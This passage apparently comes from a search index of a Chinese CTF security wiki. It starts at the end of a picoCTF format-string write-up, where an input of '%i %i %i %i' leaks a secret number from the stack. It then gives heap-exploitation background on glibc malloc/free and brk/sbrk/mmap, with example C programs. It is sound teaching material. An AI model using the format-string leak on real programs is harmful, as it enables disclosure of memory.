\u8fd9\u5e76\u4e0d\u9002\u7528\u4e8e\u771f\u6b63\u7684\u76ee\u6807\uff0c\u5f88\u53ef\u80fd\u662f\u56e0\u4e3a\u4e8c\u8fdb\u5236\u662f\u5728\u4e0d\u540c\u7684\u7cfb\u7edf\u4e0b\u7f16\u8bd1\u7684\uff0c\u4f46\u662f\u6709\u4e00\u70b9\u66b4\u529b\u7684\u5f3a\u8feb\uff0c\u6211\u6700\u7ec8\u53ef\u4ee5\u5de5\u4f5c  $ ./guess\nHello! What is your name?\n%i %i %i %i\nWelcome to the guessing game, 32 -143569888 160419848 765327463\n\nI generated a random 32-bit number.\nYou have a 1 in 2^32 chance of guessing it. Good luck.\nWhat is your guess?\n765327463\nWow! You guessed it!\nYour flag is: xctf{xxxxx}", 
            "title": "\u6b65\u9aa4"
        }, 
        {
            "location": "/pwn/fmtstr/example/picoctf-2014-guess/Write-up_cn/#_6", 
            "text": "\u638c\u63e1\u597d\u505aPWN\u9898\u76ee\u7684\u5927\u81f4\u601d\u8def\uff0c\u5b66\u4f1a\u5bfb\u627e\u4fee\u6539shellcode\u3002", 
            "title": "[\u603b\u7ed3]"
        }, 
        {
            "location": "/pwn/heap/introduction/", 
            "text": "\u5806\u5229\u7528\n\n\n\u5728\u8be5\u7ae0\u8282\u4e2d\uff0c\u6211\u4eec\u4f1a\u6309\u7167\u5982\u4e0b\u7684\u6b65\u9aa4\u8fdb\u884c\u4ecb\u7ecd\n\n\n\n\n\u4ecb\u7ecd\u6211\u4eec\u6240\u719f\u77e5\u7684\u52a8\u6001\u5185\u5b58\u5206\u914d\u7684\u5806\u7684\u5b8f\u89c2\u64cd\u4f5c\n\n\n\u4ecb\u7ecd\u4e3a\u4e86\u8fbe\u5230\u8fd9\u4e9b\u64cd\u4f5c\u6240\u4f7f\u7528\u7684\u6570\u636e\u7ed3\u6784\n\n\n\u4ecb\u7ecd\u5229\u7528\u8fd9\u4e9b\u6570\u636e\u7ed3\u6784\u5b9e\u73b0\u5806\u7684\u5206\u914d\u4e0e\u56de\u6536\u7684\u5177\u4f53\u64cd\u4f5c\n\n\n\u7531\u6d45\u5165\u6df1\u5730\u4ecb\u7ecd\u5806\u7684\u5404\u79cd\u5229\u7528\u6280\u5de7\u3002\n\n\n\n\n\u5bf9\u4e8e\u4e0d\u540c\u7684\u5e94\u7528\u6765\u8bf4\uff0c\u7531\u4e8e\u5185\u5b58\u7684\u9700\u6c42\u5404\u4e0d\u76f8\u540c\u7b49\u7279\u6027\uff0c\u56e0\u6b64\u76ee\u524d\u5806\u7684\u5b9e\u73b0\u6709\u5f88\u591a\u79cd\uff0c\u5177\u4f53\u5982\u4e0b\n\n\ndlmalloc  \u2013 General purpose allocator\nptmalloc2 \u2013 glibc\njemalloc  \u2013 FreeBSD and Firefox\ntcmalloc  \u2013 Google\nlibumem   \u2013 Solaris\n\n\n\n\n\u8fd9\u91cc\u6211\u4eec\u4e3b\u8981\u4ee5 glibc \u4e2d\u5806\u7684\u5b9e\u73b0\u4e3a\u4e3b\u8fdb\u884c\u4ecb\u7ecd\u3002\u5982\u679c\u540e\u7eed\u6709\u65f6\u95f4\uff0c\u4f1a\u7ee7\u7eed\u4ecb\u7ecd\u5176\u5b83\u5806\u7684\u5b9e\u73b0\u53ca\u5176\u5229\u7528\u3002\n\n\n\u8be5\u90e8\u5206\u4e3b\u8981\u53c2\u8003\u7684\u8d44\u6599\u5982\u4e0b\uff0c\u6587\u4e2d\u6709\u5f88\u591a\u5185\u5bb9\u4f1a\u548c\u53c2\u8003\u8d44\u6599\u4e2d\u4e00\u81f4\uff0c\u4ee5\u540e\u5c31\u4e0d\u4e00\u4e00\u8bf4\u660e\u4e86\u3002\n\n\n\n\nblack hat heap exploitation\n\n\ngithub heap exploition\n\n\nsploitfun\n\n\nglibc \u6e90\u7801\n\n\n\u66f4\u591a\u7684\u53c2\u8003\u6587\u732e\u8bf7\u770bref\u76ee\u5f55\u4e0b\u7684\u6587\u4ef6", 
            "title": "\u5806\u5229\u7528\u7b80\u4ecb"
        }, 
        {
            "location": "/pwn/heap/introduction/#_1", 
            "text": "\u5728\u8be5\u7ae0\u8282\u4e2d\uff0c\u6211\u4eec\u4f1a\u6309\u7167\u5982\u4e0b\u7684\u6b65\u9aa4\u8fdb\u884c\u4ecb\u7ecd   \u4ecb\u7ecd\u6211\u4eec\u6240\u719f\u77e5\u7684\u52a8\u6001\u5185\u5b58\u5206\u914d\u7684\u5806\u7684\u5b8f\u89c2\u64cd\u4f5c  \u4ecb\u7ecd\u4e3a\u4e86\u8fbe\u5230\u8fd9\u4e9b\u64cd\u4f5c\u6240\u4f7f\u7528\u7684\u6570\u636e\u7ed3\u6784  \u4ecb\u7ecd\u5229\u7528\u8fd9\u4e9b\u6570\u636e\u7ed3\u6784\u5b9e\u73b0\u5806\u7684\u5206\u914d\u4e0e\u56de\u6536\u7684\u5177\u4f53\u64cd\u4f5c  \u7531\u6d45\u5165\u6df1\u5730\u4ecb\u7ecd\u5806\u7684\u5404\u79cd\u5229\u7528\u6280\u5de7\u3002   \u5bf9\u4e8e\u4e0d\u540c\u7684\u5e94\u7528\u6765\u8bf4\uff0c\u7531\u4e8e\u5185\u5b58\u7684\u9700\u6c42\u5404\u4e0d\u76f8\u540c\u7b49\u7279\u6027\uff0c\u56e0\u6b64\u76ee\u524d\u5806\u7684\u5b9e\u73b0\u6709\u5f88\u591a\u79cd\uff0c\u5177\u4f53\u5982\u4e0b  dlmalloc  \u2013 General purpose allocator\nptmalloc2 \u2013 glibc\njemalloc  \u2013 FreeBSD and Firefox\ntcmalloc  \u2013 Google\nlibumem   \u2013 Solaris  \u8fd9\u91cc\u6211\u4eec\u4e3b\u8981\u4ee5 glibc \u4e2d\u5806\u7684\u5b9e\u73b0\u4e3a\u4e3b\u8fdb\u884c\u4ecb\u7ecd\u3002\u5982\u679c\u540e\u7eed\u6709\u65f6\u95f4\uff0c\u4f1a\u7ee7\u7eed\u4ecb\u7ecd\u5176\u5b83\u5806\u7684\u5b9e\u73b0\u53ca\u5176\u5229\u7528\u3002  \u8be5\u90e8\u5206\u4e3b\u8981\u53c2\u8003\u7684\u8d44\u6599\u5982\u4e0b\uff0c\u6587\u4e2d\u6709\u5f88\u591a\u5185\u5bb9\u4f1a\u548c\u53c2\u8003\u8d44\u6599\u4e2d\u4e00\u81f4\uff0c\u4ee5\u540e\u5c31\u4e0d\u4e00\u4e00\u8bf4\u660e\u4e86\u3002   black hat heap exploitation  github heap exploition  sploitfun  glibc \u6e90\u7801  \u66f4\u591a\u7684\u53c2\u8003\u6587\u732e\u8bf7\u770bref\u76ee\u5f55\u4e0b\u7684\u6587\u4ef6", 
            "title": "\u5806\u5229\u7528"
        }, 
        {
            "location": "/pwn/heap/heap_overview/", 
            "text": "\u5806\u6982\u8ff0\n\n\n\u4ec0\u4e48\u662f\u5806\n\n\n\u5728\u7a0b\u5e8f\u8fd0\u884c\u8fc7\u7a0b\u4e2d\uff0c\u5806\u53ef\u4ee5\u63d0\u4f9b\u52a8\u6001\u5206\u914d\u7684\u5185\u5b58\uff0c\u5141\u8bb8\u7a0b\u5e8f\u7533\u8bf7\u5927\u5c0f\u672a\u77e5\u7684\u5185\u5b58\u3002\u5806\u5176\u5b9e\u5c31\u662f\u7a0b\u5e8f\u865a\u62df\u5730\u5740\u7a7a\u95f4\u7684\u4e00\u5757\u8fde\u7eed\u7684\u7ebf\u6027\u533a\u57df\uff0c\u5b83\u7531\u4f4e\u5730\u5740\u5411\u9ad8\u5730\u5740\u65b9\u5411\u589e\u957f\u3002\u6211\u4eec\u4e00\u822c\u79f0\u7ba1\u7406\u5806\u7684\u90a3\u90e8\u5206\u7a0b\u5e8f\u4e3a\u5806\u7ba1\u7406\u5668\u3002\n\n\n\u5806\u7ba1\u7406\u5668\u5904\u4e8e\u7528\u6237\u7a0b\u5e8f\u4e0e\u5185\u6838\u4e2d\u95f4\uff0c\u4e3b\u8981\u505a\u4ee5\u4e0b\u5de5\u4f5c\n\n\n\n\n\u54cd\u5e94\u7528\u6237\u7684\u7533\u8bf7\u5185\u5b58\u8bf7\u6c42\uff0c\u5411\u64cd\u4f5c\u7cfb\u7edf\u7533\u8bf7\u5185\u5b58\uff0c\u7136\u540e\u5c06\u5176\u8fd4\u56de\u7ed9\u7528\u6237\u7a0b\u5e8f\u3002\u540c\u65f6\uff0c\u4e3a\u4e86\u4fdd\u6301\u5185\u5b58\u7ba1\u7406\u7684\u9ad8\u6548\u6027\uff0c\u5185\u6838\u4e00\u822c\u90fd\u4f1a\u9884\u5148\u5206\u914d\u5f88\u5927\u7684\u4e00\u5757\u8fde\u7eed\u7684\u5185\u5b58\uff0c\u7136\u540e\u8ba9\u5806\u7ba1\u7406\u5668\u901a\u8fc7\u67d0\u79cd\u7b97\u6cd5\u7ba1\u7406\u8fd9\u5757\u5185\u5b58\u3002\u53ea\u6709\u5f53\u51fa\u73b0\u4e86\u5806\u7a7a\u95f4\u4e0d\u8db3\u7684\u60c5\u51b5\uff0c\u5806\u7ba1\u7406\u5668\u624d\u4f1a\u518d\u6b21\u4e0e\u64cd\u4f5c\u7cfb\u7edf\u8fdb\u884c\u4ea4\u4e92\u3002\n\n\n\u7ba1\u7406\u7528\u6237\u6240\u91ca\u653e\u7684\u5185\u5b58\u3002\u4e00\u822c\u6765\u8bf4\uff0c\u7528\u6237\u91ca\u653e\u7684\u5185\u5b58\u5e76\u4e0d\u662f\u76f4\u63a5\u8fd4\u8fd8\u7ed9\u64cd\u4f5c\u7cfb\u7edf\u7684\uff0c\u800c\u662f\u7531\u5806\u7ba1\u7406\u5668\u8fdb\u884c\u7ba1\u7406\u3002\u8fd9\u4e9b\u91ca\u653e\u7684\u5185\u5b58\u53ef\u4ee5\u6765\u54cd\u5e94\u7528\u6237\u65b0\u7533\u8bf7\u7684\u5185\u5b58\u7684\u8bf7\u6c42\u3002\n\n\n\n\nLinux \u4e2d\u65e9\u671f\u7684\u5806\u5206\u914d\u4e0e\u56de\u6536\u7531 Doug Lea \u5b9e\u73b0\uff0c\u4f46\u5b83\u5728\u5e76\u884c\u5904\u7406\u591a\u4e2a\u7ebf\u7a0b\u65f6\uff0c\u4f1a\u5171\u4eab\u8fdb\u7a0b\u7684\u5806\u5185\u5b58\u7a7a\u95f4\u3002\u56e0\u6b64\uff0c\u4e3a\u4e86\u5b89\u5168\u6027\uff0c\u4e00\u4e2a\u7ebf\u7a0b\u4f7f\u7528\u5806\u65f6\uff0c\u4f1a\u8fdb\u884c\u52a0\u9501\u3002\u7136\u800c\uff0c\u4e0e\u6b64\u540c\u65f6\uff0c\u52a0\u9501\u4f1a\u5bfc\u81f4\u5176\u5b83\u7ebf\u7a0b\u65e0\u6cd5\u4f7f\u7528\u5806\uff0c\u964d\u4f4e\u4e86\u5185\u5b58\u5206\u914d\u548c\u56de\u6536\u7684\u9ad8\u6548\u6027\u3002\u540c\u65f6\uff0c\u5982\u679c\u5728\u591a\u7ebf\u7a0b\u4f7f\u7528\u65f6\uff0c\u6ca1\u80fd\u6b63\u786e\u63a7\u5236\uff0c\u4e5f\u53ef\u80fd\u5f15\u8d77\u5185\u5b58\u5206\u914d\u548c\u56de\u6536\u7684\u6b63\u786e\u6027\u3002Wolfram Gloger \u5728 Doug Lea \u7684\u57fa\u7840\u4e0a\u8fdb\u884c\u6539\u8fdb\u4f7f\u5176\u53ef\u4ee5\u652f\u6301\u591a\u7ebf\u7a0b\uff0c\u8fd9\u4e2a\u5806\u5206\u914d\u5668\u5c31\u662f ptmalloc \u3002\u5728 glibc-2.3.x. \u4e4b\u540e\uff0cglibc \u4e2d\u96c6\u6210\u4e86ptmalloc2\u3002\n\n\n\u76ee\u524d Linux \u6807\u51c6\u53d1\u884c\u7248\u4e2d\u4f7f\u7528\u7684\u5806\u5206\u914d\u5668\u662f glibc \u4e2d\u7684\u5806\u5206\u914d\u5668\uff1aptmalloc2\u3002ptmalloc2 \u4e3b\u8981\u662f\u901a\u8fc7 malloc/free \u51fd\u6570\u6765\u5206\u914d\u548c\u91ca\u653e\u5185\u5b58\u5757\u3002\n\n\n\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5728\u5185\u5b58\u5206\u914d\u4e0e\u4f7f\u7528\u7684\u8fc7\u7a0b\u4e2d\uff0cLinux\u6709\u8fd9\u6837\u7684\u4e00\u4e2a\u57fa\u672c\u5185\u5b58\u7ba1\u7406\u601d\u60f3\uff0c\n\u53ea\u6709\u5f53\u771f\u6b63\u8bbf\u95ee\u4e00\u4e2a\u5730\u5740\u7684\u65f6\u5019\uff0c\u7cfb\u7edf\u624d\u4f1a\u5efa\u7acb\u865a\u62df\u9875\u9762\u4e0e\u7269\u7406\u9875\u9762\u7684\u6620\u5c04\u5173\u7cfb\n\u3002 \u6240\u4ee5\u867d\u7136\u64cd\u4f5c\u7cfb\u7edf\u5df2\u7ecf\u7ed9\u7a0b\u5e8f\u5206\u914d\u4e86\u5f88\u5927\u7684\u4e00\u5757\u5185\u5b58\uff0c\u4f46\u662f\u8fd9\u5757\u5185\u5b58\u5176\u5b9e\u53ea\u662f\u865a\u62df\u5185\u5b58\u3002\u53ea\u6709\u5f53\u7528\u6237\u4f7f\u7528\u5230\u76f8\u5e94\u7684\u5185\u5b58\u65f6\uff0c\u7cfb\u7edf\u624d\u4f1a\u771f\u6b63\u5206\u914d\u7269\u7406\u9875\u9762\u7ed9\u7528\u6237\u4f7f\u7528\u3002\n\n\n\u5806\u7684\u57fa\u672c\u64cd\u4f5c\n\n\n\u8fd9\u91cc\u6211\u4eec\u4e3b\u8981\u4ecb\u7ecd\n\n\n\n\n\u57fa\u672c\u7684\u5806\u64cd\u4f5c\uff0c\u5305\u62ec\u5806\u7684\u5206\u914d\uff0c\u56de\u6536\uff0c\u5806\u5206\u914d\u80cc\u540e\u7684\u7cfb\u7edf\u8c03\u7528\n\n\n\u4ecb\u7ecd\u5806\u76ee\u524d\u7684\u591a\u7ebf\u7a0b\u652f\u6301\u3002\n\n\n\n\nmalloc\n\n\n\u5728 glibc \u7684\nmalloc.h\n\u4e2d\uff0cmalloc \u7684\u8bf4\u660e\u5982\u4e0b\n\n\n/*\n\n\n  malloc(size_t n)\n\n\n  Returns a pointer to a newly allocated chunk of at least n bytes, or null\n\n\n  if no space is available. Additionally, on failure, errno is\n\n\n  set to ENOMEM on ANSI C systems.\n\n\n  If n is zero, malloc returns a minumum-sized chunk. (The minimum\n\n\n  size is 16 bytes on most 32bit systems, and 24 or 32 bytes on 64bit\n\n\n  systems.)  On most systems, size_t is an unsigned type, so calls\n\n\n  with negative arguments are interpreted as requests for huge amounts\n\n\n  of space, which will often fail. The maximum supported value of n\n\n\n  differs across systems, but is in all cases less than the maximum\n\n\n  representable value of a size_t.\n\n\n*/\n\n\n\n\n\n\u53ef\u4ee5\u770b\u51fa\uff0cmalloc \u51fd\u6570\u8fd4\u56de\u5bf9\u5e94\u5927\u5c0f\u5b57\u8282\u7684\u5185\u5b58\u5757\u7684\u6307\u9488\u3002\u6b64\u5916\uff0c\u8be5\u51fd\u6570\u8fd8\u5bf9\u4e00\u4e9b\u5f02\u5e38\u60c5\u51b5\u8fdb\u884c\u4e86\u5904\u7406\n\n\n\n\n\u5f53 n=0 \u65f6\uff0c\u8fd4\u56de\u5f53\u524d\u7cfb\u7edf\u5141\u8bb8\u7684\u5806\u7684\u6700\u5c0f\u5185\u5b58\u5757\u3002\n\n\n\u5f53 n \u4e3a\u8d1f\u6570\u65f6\uff0c\u7531\u4e8e\u5728\u5927\u591a\u6570\u7cfb\u7edf\u4e0a\uff0c\nsize_t \u662f\u65e0\u7b26\u53f7\u6570\uff08\u8fd9\u4e00\u70b9\u975e\u5e38\u91cd\u8981\uff09\n\uff0c\u6240\u4ee5\u7a0b\u5e8f\u5c31\u4f1a\u7533\u8bf7\u5f88\u5927\u7684\u5185\u5b58\u7a7a\u95f4\uff0c\u4f46\u901a\u5e38\u6765\u8bf4\u90fd\u4f1a\u5d29\u6e83\uff0c\u56e0\u4e3a\u7cfb\u7edf\u6ca1\u6709\u90a3\u4e48\u591a\u7684\u5185\u5b58\u53ef\u4ee5\u5206\u914d\u3002\n\n\n\n\nfree\n\n\n\u5728 glibc \u7684 \nmalloc.h\n \u4e2d\uff0cfree \u7684\u8bf4\u660e\u5982\u4e0b\n\n\n/*\n\n\n      free(void* p)\n\n\n      Releases the chunk of memory pointed to by p, that had been previously\n\n\n      allocated using malloc or a related routine such as realloc.\n\n\n      It has no effect if p is null. It can have arbitrary (i.e., bad!)\n\n\n      effects if p has already been freed.\n\n\n      Unless disabled (using mallopt), freeing very large spaces will\n\n\n      when possible, automatically trigger operations that give\n\n\n      back unused memory to the system, thus reducing program footprint.\n\n\n    */\n\n\n\n\n\n\u53ef\u4ee5\u770b\u51fa\uff0cfree \u51fd\u6570\u4f1a\u91ca\u653e\u7531 p \u6240\u6307\u5411\u7684\u5185\u5b58\u5757\u3002\u8fd9\u4e2a\u5185\u5b58\u5757\u6709\u53ef\u80fd\u662f\u901a\u8fc7 malloc \u51fd\u6570\u5f97\u5230\u7684\uff0c\u4e5f\u6709\u53ef\u80fd\u662f\u901a\u8fc7\u76f8\u5173\u7684\u51fd\u6570 realloc \u5f97\u5230\u7684\u3002\n\n\n\u6b64\u5916\uff0c\u8be5\u51fd\u6570\u4e5f\u540c\u6837\u5bf9\u5f02\u5e38\u60c5\u51b5\u8fdb\u884c\u4e86\u5904\u7406\n\n\n\n\n\u5f53 p \u4e3a\u7a7a\u6307\u9488\u65f6\uff0c\u51fd\u6570\u4e0d\u6267\u884c\u4efb\u4f55\u64cd\u4f5c\u3002\n\n\n\u5f53 p \u5df2\u7ecf\u88ab\u91ca\u653e\u4e4b\u540e\uff0c\u518d\u6b21\u91ca\u653e\u4f1a\u51fa\u73b0\u4e71\u4e03\u516b\u7cdf\u7684\u6548\u679c\uff0c\u8fd9\u5176\u5b9e\u5c31\u662f \ndouble free\n\u3002\n\n\n\u9664\u4e86\u88ab\u7981\u7528 (mallopt) \u7684\u60c5\u51b5\u4e0b\uff0c\u5f53\u91ca\u653e\u5f88\u5927\u7684\u5185\u5b58\u7a7a\u95f4\u65f6\uff0c\u7a0b\u5e8f\u4f1a\u5c06\u8fd9\u4e9b\u5185\u5b58\u7a7a\u95f4\u8fd8\u7ed9\u7cfb\u7edf\uff0c\u4ee5\u4fbf\u4e8e\u51cf\u5c0f\u7a0b\u5e8f\u6240\u4f7f\u7528\u7684\u5185\u5b58\u7a7a\u95f4\u3002\n\n\n\n\n\u5185\u5b58\u5206\u914d\u80cc\u540e\u7684\u7cfb\u7edf\u8c03\u7528\n\n\n\u5728\u524d\u9762\u63d0\u5230\u7684\u51fd\u6570\u4e2d\uff0c\u65e0\u8bba\u662f malloc \u51fd\u6570\u8fd8\u662f free \u51fd\u6570\uff0c\u6211\u4eec\u52a8\u6001\u7533\u8bf7\u548c\u91ca\u653e\u5185\u5b58\u65f6\uff0c\u90fd\u7ecf\u5e38\u4f1a\u4f7f\u7528\uff0c\u4f46\u662f\u5b83\u4eec\u5e76\u4e0d\u662f\u771f\u6b63\u4e0e\u7cfb\u7edf\u4ea4\u4e92\u7684\u51fd\u6570\u3002\u8fd9\u4e9b\u51fd\u6570\u80cc\u540e\u7684\u7cfb\u7edf\u8c03\u7528\u4e3b\u8981\u662f \n(s)brk\n \u51fd\u6570\u4ee5\u53ca \nmmap, munmap\n \u51fd\u6570\u3002\n\n\n\u5982\u4e0b\u56fe\u6240\u793a\uff0c\u6211\u4eec\u4e3b\u8981\u8003\u8651\u5bf9\u5806\u8fdb\u884c\u7533\u8bf7\u5185\u5b58\u5757\u7684\u64cd\u4f5c\u3002\n\n\n\n\n(s)brk\n\n\n\u5bf9\u4e8e\u5806\u7684\u64cd\u4f5c\uff0c\u64cd\u4f5c\u7cfb\u7edf\u63d0\u4f9b\u4e86 brk \u51fd\u6570\uff0cglibc \u5e93\u63d0\u4f9b\u4e86 sbrk \u51fd\u6570\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u589e\u52a0 \nbrk\n (program break location, the program break is the address of the first location beyond the current end of the data region, \nhttps://en.wikipedia.org/wiki/Sbrk)\u7684\u5927\u5c0f\u6765\u5411\u64cd\u4f5c\u7cfb\u7edf\u7533\u8bf7\u5185\u5b58\n\u3002\n\n\n\u521d\u59cb\u65f6\uff0c\u5806\u7684\u8d77\u59cb\u5730\u5740 \nstart_brk\n \u4ee5\u53ca\u5806\u7684\u5f53\u524d\u672b\u5c3e \nbrk\n \u6307\u5411\u540c\u4e00\u5730\u5740\u3002\u6839\u636e\u662f\u5426\u5f00\u542fASLR\uff0c\u4e24\u8005\u7684\u5177\u4f53\u4f4d\u7f6e\u4f1a\u6709\u6240\u4e0d\u540c\n\n\n\n\n\u4e0d\u5f00\u542f ASLR \u4fdd\u62a4\u65f6\uff0cstart_brk \u4ee5\u53ca brk \u4f1a\u6307\u5411 data/bss \u6bb5\u7684\u7ed3\u5c3e\u3002\n\n\n\u5f00\u542f ASLR \u4fdd\u62a4\u65f6\uff0cstart_brk \u4ee5\u53ca brk \u4e5f\u4f1a\u6307\u5411\u540c\u4e00\u4f4d\u7f6e\uff0c\u53ea\u662f\u8fd9\u4e2a\u4f4d\u7f6e\u662f\u5728 data/bss \u6bb5\u7ed3\u5c3e\u540e\u7684\u968f\u673a\u504f\u79fb\u5904\u3002\n\n\n\n\n\u5177\u4f53\u6548\u679c\u5982\u4e0b\u56fe\uff08\u8fd9\u4e2a\u56fe\u7247\u4e0e\u7f51\u4e0a\u6d41\u4f20\u7684\u57fa\u672c\u4e00\u81f4\uff0c\u8fd9\u91cc\u662f\u56e0\u4e3a\u8981\u753b\u4e00\u5f20\u5927\u56fe\uff0c\u6240\u4ee5\u81ea\u5df1\u5355\u72ec\u753b\u4e86\u4e0b\uff09\u6240\u793a\n\n\n\n\n\u4f8b\u5b50\n\n\n/* sbrk and brk example */\n\n\n##include \nstdio.h\n\n\n##include \nunistd.h\n\n\n##include \nsys/types.h\n\n\n\nint\n \nmain\n()\n\n\n{\n\n        \nvoid\n \n*\ncurr_brk\n,\n \n*\ntmp_brk\n \n=\n \nNULL\n;\n\n\n        \nprintf\n(\nWelcome to sbrk example:%d\n\\n\n,\n \ngetpid\n());\n\n\n        \n/* sbrk(0) gives current program break location */\n\n        \ntmp_brk\n \n=\n \ncurr_brk\n \n=\n \nsbrk\n(\n0\n);\n\n        \nprintf\n(\nProgram Break Location1:%p\n\\n\n,\n \ncurr_brk\n);\n\n        \ngetchar\n();\n\n\n        \n/* brk(addr) increments/decrements program break location */\n\n        \nbrk\n(\ncurr_brk\n+\n4096\n);\n\n\n        \ncurr_brk\n \n=\n \nsbrk\n(\n0\n);\n\n        \nprintf\n(\nProgram break Location2:%p\n\\n\n,\n \ncurr_brk\n);\n\n        \ngetchar\n();\n\n\n        \nbrk\n(\ntmp_brk\n);\n\n\n        \ncurr_brk\n \n=\n \nsbrk\n(\n0\n);\n\n        \nprintf\n(\nProgram Break Location3:%p\n\\n\n,\n \ncurr_brk\n);\n\n        \ngetchar\n();\n\n\n        \nreturn\n \n0\n;\n\n\n}\n\n\n\n\n\n\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5728\u6bcf\u4e00\u6b21\u6267\u884c\u5b8c\u64cd\u4f5c\u540e\uff0c\u90fd\u6267\u884c\u4e86getchar()\u51fd\u6570\uff0c\u8fd9\u662f\u4e3a\u4e86\u6211\u4eec\u65b9\u4fbf\u6211\u4eec\u67e5\u770b\u7a0b\u5e8f\u771f\u6b63\u7684\u6620\u5c04\u3002\n\n\n\u5728\u7b2c\u4e00\u6b21\u8c03\u7528brk\u4e4b\u524d\n\n\n\u4ece\u4e0b\u9762\u7684\u8f93\u51fa\u53ef\u4ee5\u770b\u51fa\uff0c\u5e76\u6ca1\u6709\u51fa\u73b0\u5806\u3002\u56e0\u6b64\n\n\n\n\nstart_brk = brk = end_data = 0x804b000\n\n\n\n\nsploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$ ./sbrk \nWelcome to sbrk example:6141\nProgram Break Location1:0x804b000\n...\nsploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$ cat /proc/6141/maps\n...\n0804a000-0804b000 rw-p \n00001000\n \n08\n:01 \n539624\n     /home/sploitfun/ptmalloc.ppt/syscalls/sbrk\nb7e21000-b7e22000 rw-p \n00000000\n \n00\n:00 \n0\n \n...\nsploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$\n\n\n\n\n\u7b2c\u4e00\u6b21\u589e\u52a0brk\u540e\n\n\n\u4ece\u4e0b\u9762\u7684\u8f93\u51fa\u53ef\u4ee5\u770b\u51fa\uff0c\u5df2\u7ecf\u51fa\u73b0\u4e86\u5806\u6bb5\n\n\n\n\nstart_brk = end_data = 0x804b000\n\n\nbrk = 0x804c000\n\n\n\n\nsploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$ ./sbrk \nWelcome to sbrk example:6141\nProgram Break Location1:0x804b000\nProgram Break Location2:0x804c000\n...\nsploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$ cat /proc/6141/maps\n...\n0804a000-0804b000 rw-p \n00001000\n \n08\n:01 \n539624\n     /home/sploitfun/ptmalloc.ppt/syscalls/sbrk\n0804b000-0804c000 rw-p \n00000000\n \n00\n:00 \n0\n          \n[\nheap\n]\n\nb7e21000-b7e22000 rw-p \n00000000\n \n00\n:00 \n0\n \n...\nsploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$\n\n\n\n\n\u5176\u4e2d\uff0c\u5173\u4e8e\u5806\u7684\u90a3\u4e00\u884c\n\n\n\n\n0x0804b000 \u662f\u76f8\u5e94\u5806\u7684\u8d77\u59cb\u5730\u5740\n\n\nrw-p\u8868\u660e\u5806\u5177\u6709\u53ef\u8bfb\u53ef\u5199\u6743\u9650\uff0c\u5e76\u4e14\u5c5e\u4e8e\u9690\u79c1\u6570\u636e\u3002\n\n\n00000000 \u8868\u660e\u6587\u4ef6\u504f\u79fb\uff0c\u7531\u4e8e\u8fd9\u90e8\u5206\u5185\u5bb9\u5e76\u4e0d\u662f\u4ece\u6587\u4ef6\u4e2d\u6620\u5c04\u5f97\u5230\u7684\uff0c\u6240\u4ee5\u4e3a0\u3002\n\n\n00:00 \u662f\u4e3b\u4ece(Major/mirror)\u7684\u8bbe\u5907\u53f7\uff0c\u8fd9\u90e8\u5206\u5185\u5bb9\u4e5f\u4e0d\u662f\u4ece\u6587\u4ef6\u4e2d\u6620\u5c04\u5f97\u5230\u7684\uff0c\u6240\u4ee5\u4e5f\u90fd\u4e3a0\u3002\n\n\n0\u8868\u793a\u7740Inode \u53f7\u3002\u7531\u4e8e\u8fd9\u90e8\u5206\u5185\u5bb9\u5e76\u4e0d\u662f\u4ece\u6587\u4ef6\u4e2d\u6620\u5c04\u5f97\u5230\u7684\uff0c\u6240\u4ee5\u4e3a0\u3002\n\n\n\n\nmmap\n\n\nmalloc \u4f1a\u4f7f\u7528 \nmmap\n\u6765\u521b\u5efa\u72ec\u7acb\u7684\u533f\u540d\u6620\u5c04\u6bb5\u3002\u533f\u540d\u6620\u5c04\u7684\u76ee\u7684\u4e3b\u8981\u662f\u53ef\u4ee5\u7533\u8bf7\u4ee50\u586b\u5145\u7684\u5185\u5b58\uff0c\u5e76\u4e14\u8fd9\u5757\u5185\u5b58\u4ec5\u88ab\u8c03\u7528\u8fdb\u7a0b\u6240\u4f7f\u7528\u3002\n\n\n\u4f8b\u5b50\n\n\n/* Private anonymous mapping example using mmap syscall */\n\n\n##include \nstdio.h\n\n\n##include \nsys/mman.h\n\n\n##include \nsys/types.h\n\n\n##include \nsys/stat.h\n\n\n##include \nfcntl.h\n\n\n##include \nunistd.h\n\n\n##include \nstdlib.h\n\n\n\nvoid\n \nstatic\n \ninline\n \nerrExit\n(\nconst\n \nchar\n*\n \nmsg\n)\n\n\n{\n\n        \nprintf\n(\n%s failed. Exiting the process\n\\n\n,\n \nmsg\n);\n\n        \nexit\n(\n-\n1\n);\n\n\n}\n\n\n\nint\n \nmain\n()\n\n\n{\n\n        \nint\n \nret\n \n=\n \n-\n1\n;\n\n        \nprintf\n(\nWelcome to private anonymous mapping example::PID:%d\n\\n\n,\n \ngetpid\n());\n\n        \nprintf\n(\nBefore mmap\n\\n\n);\n\n        \ngetchar\n();\n\n        \nchar\n*\n \naddr\n \n=\n \nNULL\n;\n\n        \naddr\n \n=\n \nmmap\n(\nNULL\n,\n \n(\nsize_t\n)\n132\n*\n1024\n,\n \nPROT_READ\n|\nPROT_WRITE\n,\n \nMAP_PRIVATE\n \n|\n \nMAP_ANONYMOUS\n,\n \n-\n1\n,\n \n0\n);\n\n        \nif\n \n(\naddr\n \n==\n \nMAP_FAILED\n)\n\n                \nerrExit\n(\nmmap\n);\n\n        \nprintf\n(\nAfter mmap\n\\n\n);\n\n        \ngetchar\n();\n\n\n        \n/* Unmap mapped region. */\n\n        \nret\n \n=\n \nmunmap\n(\naddr\n,\n \n(\nsize_t\n)\n132\n*\n1024\n);\n\n        \nif\n(\nret\n \n==\n \n-\n1\n)\n\n                \nerrExit\n(\nmunmap\n);\n\n        \nprintf\n(\nAfter munmap\n\\n\n);\n\n        \ngetchar\n();\n\n        \nreturn\n 